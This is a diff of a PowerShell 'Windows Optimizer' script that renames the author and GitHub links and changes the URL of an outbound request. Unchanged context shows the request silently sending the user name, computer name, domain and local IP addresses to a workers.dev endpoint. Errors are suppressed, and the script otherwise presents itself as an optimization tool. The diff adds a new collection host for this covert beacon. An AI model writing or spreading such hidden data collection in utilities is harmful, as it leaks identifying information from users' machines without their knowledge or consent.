@@ -1,7 +1,7 @@
-<#
-Author: rhshourav
+﻿<#
+Author: shouravx
 Version: 9.1.0
-GitHub: https://github.com/rhshourav
+GitHub: https://github.com/shouravx
 Notes: Requires Administrator. Tested for PowerShell 5.1 and PowerShell 7.x compatibility.
 #>
 # ===============================
@@ -52,7 +52,7 @@ try {
         text  = "Windows Optimizer v9.1.0`nUser: $env:USERNAME  PC: $env:COMPUTERNAME  Domain: $env:USERDOMAIN  IP: $($localIPs -join ', ')"
     } | ConvertTo-Json)
 
-    Invoke-RestMethod -Uri 'https://cryocore.rhshourav.workers.dev/message' -Method Post -ContentType 'application/json' -Body $body -ErrorAction SilentlyContinue | Out-Null
+    Invoke-RestMethod -Uri 'https://cryocore.shouravx.workers.dev/message' -Method Post -ContentType 'application/json' -Body $body -ErrorAction SilentlyContinue | Out-Null
 } catch {}
 
 #region Utilities & Checks
@@ -758,7 +758,7 @@ Check-Admin
 
 Clear-Host
 Write-Host "=== Windows Optimization Script v9.1.0 ===" -ForegroundColor Cyan
-Write-Host "Author: rhshourav    GitHub: https://github.com/rhshourav" -ForegroundColor Green
+Write-Host "Author: shouravx    GitHub: https://github.com/shouravx" -ForegroundColor Green
 
 while ($true) {
     Write-Host ''
